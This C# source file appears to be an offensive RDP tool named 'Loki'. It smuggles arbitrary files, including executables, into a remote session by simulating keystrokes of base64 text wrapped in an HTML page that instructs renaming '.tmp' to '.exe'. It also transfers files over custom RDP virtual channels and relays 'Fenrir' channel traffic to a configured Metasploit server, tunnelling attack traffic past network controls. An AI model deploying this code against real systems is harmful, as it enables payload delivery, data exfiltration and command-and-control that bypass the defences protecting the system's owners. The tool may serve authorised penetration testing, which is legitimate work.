using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using MSTSCLib;
using WindowsInput;
using System.IO;
using System.Text.RegularExpressions;
using System.Net.Sockets;
using System.Net;
using System.Net.Security;

namespace Loki
{
    public partial class Loki : Form
    {
        public Loki()
        {
            InitializeComponent();
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            connect();
        }

        public string inputName = "";
        public string header = "";
        public string endFile = "";
        public int milliSeconds = 2;
        public string title = "";
        public AxMSTSCLib.IMsTscAxEvents_OnDisconnectedEventHandler disconnectedEventHandler;
        public bool connecting = false;
        public bool hasbeenconnected = false;
        public byte[] FileContent = new byte[1536];
        public string sTitle = "";
        public int iFileContentLength = 0;
        public string sTitleTrimmed = "";
        public int iProgressMax = 0;
        public int iProgressStep = 0;

        

        public void disconnect()
        {
            rdp.Disconnect();
        }
        public void connect()
        {

            rdp.Server = Form1.sRDPServer;
            IMsTscNonScriptable secured = (IMsTscNonScriptable)rdp.GetOcx();
            //The following 2 settings are for NLA support
            rdp.AdvancedSettings5.AuthenticationLevel = 2;
            if (Form1.NLA == true)
            {
                rdp.AdvancedSettings7.EnableCredSspSupport = true;
            }
            else
            {
                rdp.AdvancedSettings7.EnableCredSspSupport = false;
            }

            if (Form1.sRDPGateway != "")
            {
                //The following 4 settings are for RDP gateways
                rdp.TransportSettings2.GatewayProfileUsageMethod = 1;
                rdp.TransportSettings2.GatewayUsageMethod = 2;
                rdp.TransportSettings2.GatewayCredsSource = 0;
                rdp.TransportSettings2.GatewayHostname = Form1.sRDPGateway;
            }
            else
            {
                rdp.TransportSettings2.GatewayUsageMethod = 0;
            }

            if (Form1.FullScreen == true)
            {
                rdp.FullScreen = true;
            }
            
            rdp.ConnectingText = "Connecting...";
            rdp.AdvancedSettings2.SmartSizing = true;
            rdp.AdvancedSettings2.overallConnectionTimeout = 20;
            //test for port
            rdp.AdvancedSettings2.RDPPort = Form1.iRDPPort;
            rdp.AdvancedSettings2.SmartSizing = true;
            
            disconnectedEventHandler = new AxMSTSCLib.IMsTscAxEvents_OnDisconnectedEventHandler(rdp_OnDisconnected);
            rdp.OnDisconnected += disconnectedEventHandler;
            rdp.OnChannelReceivedData += new AxMSTSCLib.IMsTscAxEvents_OnChannelReceivedDataEventHandler(rdp_OnChannelReceivedData);


            if (hasbeenconnected == false)
            {
                rdp.CreateVirtualChannels("Loki1,Fenrir");
                hasbeenconnected = true;
            }

            rdp.Connect();
            
        }

        private void rdp_OnDisconnected(object sender, AxMSTSCLib.IMsTscAxEvents_OnDisconnectedEvent e)
        {
            string disconnectedReason = string.Empty;
            bool showMessage = false;

            switch (e.discReason)
            {
                case 0: disconnectedReason = "No information is available."; showMessage = true; break;
                case 1: disconnectedReason = "Local disconnection."; showMessage = true; break;
                case 2: disconnectedReason = "Remote disconnection by user."; showMessage = true; break;
                case 3: disconnectedReason = "Remote disconnection by server."; showMessage = true; break;
                case 260: disconnectedReason = "DNS name lookup failure"; showMessage = true; break;
                case 262: disconnectedReason = "Out of memory."; showMessage = true; break;
                case 264: disconnectedReason = "Connection timed out."; showMessage = true; break;
                case 516: disconnectedReason = "Winsock socket connect failure."; showMessage = true; break;
                case 518: disconnectedReason = "Out of memory."; showMessage = true; break;
                case 520: disconnectedReason = "Host not found."; showMessage = true; break;
                case 772: disconnectedReason = "Winsock send call failure."; showMessage = true; break;
                case 774: disconnectedReason = "Out of memory."; showMessage = true; break;
                case 776: disconnectedReason = "Invalid IP address specified."; showMessage = true; break;
                case 1028: disconnectedReason = "Winsock recv call failure."; showMessage = true; break;
                case 1030: disconnectedReason = "Invalid security data."; showMessage = true; break;
                case 1032: disconnectedReason = "Internal error."; showMessage = true; break;
                case 1286: disconnectedReason = "Invalid encryption method specified."; showMessage = true; break;
                case 1288: disconnectedReason = "DNS lookup failed."; showMessage = true; break;
                case 1540: disconnectedReason = "Failed to find the requested server, device, or host."; showMessage = true; break;
                case 1542: disconnectedReason = "Invalid server security data."; showMessage = true; break;
                case 1544: disconnectedReason = "Internal timer error."; showMessage = true; break;
                case 1796: disconnectedReason = "Timeout occurred."; showMessage = true; break;
                case 1798: disconnectedReason = "Failed to unpack server certificate."; showMessage = true; break;
                case 2052: disconnectedReason = "Bad IP address specified."; showMessage = true; break;
                case 2055: disconnectedReason = "Login failed."; showMessage = true; break;
                case 2056: disconnectedReason = "Internal security error."; showMessage = true; break;
                case 2308: disconnectedReason = "Socket closed."; showMessage = true; break;
                case 2310: disconnectedReason = "Internal security error."; showMessage = true; break;
                case 2312: disconnectedReason = "Licensing timeout."; showMessage = true; break;
                case 2566: disconnectedReason = "Internal security error."; showMessage = true; break;
                case 2567: disconnectedReason = "The specified user has no account. "; showMessage = true; break;
                case 2822: disconnectedReason = "Encryption error."; break;
                case 2823: disconnectedReason = "The account is disabled"; break;
                case 2825: disconnectedReason = "The remote computer requires Network Level Authentication. Enable NLA in connection options"; showMessage = true; break;
                case 3078: disconnectedReason = "Decryption error."; showMessage = true; break;
                case 3079: disconnectedReason = "The account is restricted"; break;
                case 3080: disconnectedReason = "Decrompression error."; showMessage = true; break;
                case 3335: disconnectedReason = "The account is locked out"; break;
                case 3591: disconnectedReason = "The account is expired"; break;
                case 3847: disconnectedReason = "The password is expired"; break;
                case 4615: disconnectedReason = "The user password must be changed before logging on for the first time."; break;
                case 5639: disconnectedReason = "The policy does not support delegation of credentials to the target server."; break;
                case 5895: disconnectedReason = "Delegation of credentials to the target server is not allowed unless mutual authentication has been achieved."; break;
                case 6151: disconnectedReason = "No authority could be contacted for authentication. The domain name of the authenticating party could be wrong, the domain could be unreachable, or there might have been a trust relationship failure."; break;
                case 6919: disconnectedReason = "The received certificate is expired."; break;
                case 7175: disconnectedReason = "An incorrect PIN was presented to the smart card."; break;
                case 8455: disconnectedReason = "The server authentication policy does not allow connection requests using saved credentials. The user must enter new credentials."; break;
                case 8711: disconnectedReason = "The smart card is blocked."; break;
                default: disconnectedReason = string.Format("Unrecognized error: code {0}", e.discReason); break;
            }

            if (showMessage == true)
            {
                MessageBox.Show(disconnectedReason);
                hasbeenconnected = false;
                this.Close();
            }
        }

        private void sendFileSendKeysToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DialogResult speed = MessageBox.Show("Is the network particularly slow?", "Browser Check", MessageBoxButtons.YesNo);
            if (speed == DialogResult.Yes)
            {
                milliSeconds = 10;
            }
            else if (speed == DialogResult.No)
            {
                milliSeconds = 3;
            }
            
            
            DialogResult checkIE = MessageBox.Show("Is the remote browser Internet Explorer?", "Browser Check", MessageBoxButtons.YesNo);
            if (checkIE == DialogResult.Yes)
            {
                header = "From: \"Loki\"\nSubject: \nMIME-Version: 1.0\nContent-Type: multipart/related;\n	type=\"text/html\";\n	boundary=\"----=_NextPart_000_0000_01CE8E9F.BEEBC5F0\"\n\nThis is a multi-part message in MIME format.\n\n------=_NextPart_000_0000_01CE8E9F.BEEBC5F0\nContent-Type: text/html;\n	charset=\"Windows-1252\"\nContent-Transfer-Encoding: quoted-printable\nContent-Location: file://C:\\Loki.html\n\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">\n<HTML><HEAD><META content=3D\"IE=3D5.0000\" =\nhttp-equiv=3D\"X-UA-Compatible\">\n\n<META http-equiv=3D\"Content-Type\" content=3D\"text/html; =\ncharset=3Dwindows-1252\">\n<META name=3D\"GENERATOR\" content=3D\"MSHTML 10.00.9200.16635\"></HEAD>\n<BODY><IMG src=3D\"file:///Loki.htm\"><h3>save this file as webpage complete (html). then rename the .tmp file to .exe<h3></BODY></HTML>\n\n------=_NextPart_000_0000_01CE8E9F.BEEBC5F0\nContent-Type: application/x-msdownload\nContent-Transfer-Encoding: base64\nContent-Location: file:///Loki.htm\n\n";
                endFile = "\n\n------=_NextPart_000_0000_01CE8E9F.BEEBC5F0--\n";
                
            }
            else if (checkIE == DialogResult.No)
            {
                header = "<a href=\"data:application/octet-stream/;base64,";
                endFile = "\" alt=\"Red dot\" />Right click and save as</a>";
            }
            openFD1.Title = "Choose a file to encode";
            openFD1.FileName = "";
            openFD1.InitialDirectory = System.Environment.GetFolderPath(Environment.SpecialFolder.Personal);
            openFD1.Filter = "All Files|*.*";
            if (openFD1.ShowDialog() != DialogResult.Cancel)
            {
                inputName = openFD1.FileName;
                MessageBox.Show("You have selected " + inputName + "\nNow ensure your client has notepad or some other text editor open before clicking send file");
            }
            
            if (inputName == "")
            {
                MessageBox.Show("Please select a file to send");
            }
            else if (inputName != "")
            {
                byte[] bytes = System.IO.File.ReadAllBytes(inputName);
                string array = System.Convert.ToBase64String(bytes);
                int timeFrame = ((array.Length + header.Length + endFile.Length) / 1000) * milliSeconds;
                var timeSpan = TimeSpan.FromSeconds(timeFrame);
                int hh = timeSpan.Hours;
                int mm = timeSpan.Minutes;
                int ss = timeSpan.Seconds;
                
                DialogResult areYouSure = MessageBox.Show("This will take around " + hh + ":" + mm + ":" + ss + " to complete! \n\nYou will not be able to abort this or use the machine until the process has finished. \n\nAre you sure you want to continue?", "Time Required", MessageBoxButtons.YesNo);
                
                if (areYouSure == DialogResult.No)
                {
                    this.Close();
                }

                // Display the ProgressBar control.
                progressBarLoki.Visible = true;
                // Set Minimum to 1 to represent the first char being sent.
                progressBarLoki.Minimum = 1;
                // Set Maximum to the total number of chars to be sent.
                progressBarLoki.Maximum = array.Length + header.Length + endFile.Length;
                // Set the initial value of the ProgressBar.
                progressBarLoki.Value = 1;
                // Set the Step property to a value of 1 to represent each char being sent.
                progressBarLoki.Step = 1;
                
                foreach (char letter in header)
                    {
                        System.Threading.Thread.Sleep(milliSeconds);
                        InputSimulator.SimulateTextEntry(letter.ToString());
                        progressBarLoki.PerformStep();
                    }

                    foreach (char letter in array)
                    {
                        System.Threading.Thread.Sleep(milliSeconds);
                        InputSimulator.SimulateTextEntry(letter.ToString());
                        progressBarLoki.PerformStep();
                    }

                    foreach (char letter in endFile)
                    {
                        System.Threading.Thread.Sleep(milliSeconds);
                        InputSimulator.SimulateTextEntry(letter.ToString());
                        progressBarLoki.PerformStep();
                    }

                    MessageBox.Show("now save the file as a html file type.");
                    progressBarLoki.Visible = false;
            }
        }

        private void sendFileOnVirtualChannelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            openFDToSendVC.Title = "Choose a file to transmit";
            openFDToSendVC.FileName = "";
            openFDToSendVC.InitialDirectory = System.Environment.GetFolderPath(Environment.SpecialFolder.Personal);
            openFDToSendVC.Filter = "All Files|*.*";

            string path = "";

            if (openFDToSendVC.ShowDialog() != DialogResult.Cancel)
            {
                path = openFDToSendVC.FileName;
            }

            try
            {

                string channel = "Loki1";
                string filename = Path.GetFileName(path);
                FileInfo fi = new FileInfo(path);

                string data = path + Char.MinValue;
                rdp.SendOnVirtualChannel(channel, filename);
                rdp.SendOnVirtualChannel(channel, fi.Length.ToString());

                using (FileStream fs = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))


                using (var stream = new MemoryStream())
                {
                    byte[] buffer = new byte[1024]; // read in chunks of 1KB

                    int bytesRead = 0;
                    while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        string chunk = System.Convert.ToBase64String(buffer);
                        rdp.SendOnVirtualChannel(channel, chunk + char.MinValue);
                        Array.Clear(buffer, 0, buffer.Length);
                        Application.DoEvents();
                        
                    }
                    string terminator = "!!!";
                    rdp.SendOnVirtualChannel(channel, terminator);

                    Array.Clear(buffer, 0, buffer.Length);
                }

            }
            catch (Exception error)
            {
                Console.WriteLine("The process failed: {0}", error.ToString());
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (rdp.Connected != 0)
            {
                disconnect();
            }
        }

        public string sFenrirReceivedRequest = "";

        private void rdp_OnChannelReceivedData(object sender, AxMSTSCLib.IMsTscAxEvents_OnChannelReceivedDataEvent e)
        {

            byte[] Data = System.Text.Encoding.Unicode.GetBytes(e.data);
            string str = System.Text.Encoding.Unicode.GetString(Data);
            byte[] Channel = System.Text.Encoding.Unicode.GetBytes(e.chanName);
            string channelName = System.Text.Encoding.Unicode.GetString(Channel);
            FileContent = Data;
            
            
            //Handle Fenrir traffic
            if (channelName == "Fenrir")
            {
                if (str == "Start of Request")
                {
                    sFenrirReceivedRequest = "";
                    rdp.SendOnVirtualChannel("Fenrir", "Received");
                }

                else if (str == "End of Request")
                {
                    
                    //strip the trailing null
                    sFenrirReceivedRequest = sFenrirReceivedRequest.Replace("\0", "");
                    
                    //convert from base64string
                    byte[] bFenrirReceivedRequest = Convert.FromBase64String(sFenrirReceivedRequest);
                    
                    //view the string
                    string decodedFenrirReceivedRequest = Encoding.UTF8.GetString(bFenrirReceivedRequest);
                    
                    //convert the string to a byte  array so it can be forwarded on.
                    if (decodedFenrirReceivedRequest != "")
                    {
                        rdp.SendOnVirtualChannel("Fenrir", "Received");
                        
                        Match match = Regex.Match(decodedFenrirReceivedRequest, @"(?<method>[A-Z]+) (?<protocol>[A-Za-z0-9]+://)?(?<host>[A-Za-z0-9\.]+)?(:)?(?<port>[0-9]+)?(?<directory>[A-Za-z0-9\./\?\&\=]+)? (HTTP\/[0-9\.]+)", RegexOptions.IgnoreCase);
                        string host = Form1.sMetasploitServer;
                        int port = Form1.iMetasploitPort;
                            
                        Application.DoEvents();
                            
                        //The below is for forwarding the packet on once we strip the IP and port from the packet
                        TcpClient client = new TcpClient();
                            
                        //check if its an IP address, if not assume hostname
                        try
                        {
                            IPAddress oAddress = null;
                            if (IPAddress.TryParse(host, out oAddress))
                            {
                                IPEndPoint serverEndPoint = new IPEndPoint(oAddress, port);
                                client.Connect(serverEndPoint);
                            }
                            else
                                client.Connect(host, port);
                         }
                         catch (Exception error)
                         {
                                MessageBox.Show(error.ToString());
                              
                            }

                            NetworkStream clientStream = client.GetStream();

                            ASCIIEncoding encoder = new ASCIIEncoding();

                            clientStream.Write(bFenrirReceivedRequest, 0, bFenrirReceivedRequest.Length);

                            //Log the requests sent
                            using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"Fenrir.log", true))
                            {
                                file.WriteLine("Request " + DateTime.Now.ToString("dd/MM/yyyy h:mm:ss tt"));
                                file.Write(encoder.GetString(bFenrirReceivedRequest, 0, bFenrirReceivedRequest.Length));
                                
                            }

                            Array.Clear(bFenrirReceivedRequest, 0, bFenrirReceivedRequest.Length);

                            byte[] bResponse = new byte[1024];
                            int bytesRead = 0;
                            while ((bytesRead = clientStream.Read(bResponse, 0, bResponse.Length)) > 0)
                            {
                               

                                //Log the responses
                                using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"Fenrir.log", true))
                                {
                                    file.WriteLine("Response " + DateTime.Now.ToString("dd/MM/yyyy h:mm:ss tt"));
                                    file.Write(encoder.GetString(bResponse, 0, bResponse.Length) + "\r\n");
                                    
                                }

                                string sResponse = Convert.ToBase64String(bResponse, 0, bResponse.Length) + "$";
                                rdp.SendOnVirtualChannel("Fenrir", sResponse);
                                clientStream.Flush();
                                Array.Clear(bResponse, 0, bResponse.Length);
                                Application.DoEvents();
                            }

                            rdp.SendOnVirtualChannel("Fenrir", "End of Response");
                            
                            sFenrirReceivedRequest = "";
                        }
                        else
                        {
                            //DO NOTHING                            
                        }
                    
                    
                }
                

                else
                {
                    sFenrirReceivedRequest += str;
                    rdp.SendOnVirtualChannel("Fenrir", "Received");
                }

            }          

            //If its not Fenrir then assume it is Sleipnir Traffic
            else
            {

                string sDecode = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(str));
                byte[] bDecode = System.Convert.FromBase64String(str);

                //Make sure its the start of the file by checking for "title:"
                if (System.Text.RegularExpressions.Regex.IsMatch(sDecode, "title:", System.Text.RegularExpressions.RegexOptions.IgnoreCase))
                {

                    sTitle = sDecode.Replace("title:", "");
                    sTitleTrimmed = sTitle.Replace("\0", string.Empty);
                    if (File.Exists(sTitleTrimmed))
                    {
                        MessageBox.Show("File already exists! Cancelling transfer");
                        rdp.SendOnVirtualChannel("Loki1", "Cancelled");
                    }
                    else
                    {
                        using (FileStream writeStream = new FileStream(sTitleTrimmed, FileMode.Create, FileAccess.Write))
                        {
                            writeStream.Flush();
                        }
                        rdp.SendOnVirtualChannel("Loki1", "Received");
                    }



                }
                //If its not the start then check that it is not the end by looking for !!!

                else if (System.Text.RegularExpressions.Regex.IsMatch(sDecode, "!!!", System.Text.RegularExpressions.RegexOptions.IgnoreCase))
                {
                    MessageBox.Show("File successfully transferred!");
                    return;
                }
                //If its not the beginning or the end then it must be the middle :)
                else
                {
                    string sDecodeTrimmed = sDecode.Replace("\0", string.Empty);
                    byte[] filecontent = System.Text.Encoding.Unicode.GetBytes(sDecode);

                    using (FileStream writeStream = new FileStream(sTitleTrimmed, FileMode.Append, FileAccess.Write))
                    {
                        writeStream.Write(bDecode, 0, filecontent.Length);
                        writeStream.Flush();
                        Array.Clear(bDecode, 0, bDecode.Length);
                    }

                    rdp.SendOnVirtualChannel("Loki1", "Received");
                }
            }                        
            
            str = "";
            channelName = "";
            Array.Clear(Data, 0, Data.Length);
            Array.Clear(Channel, 0, Channel.Length);
        }

    }
}
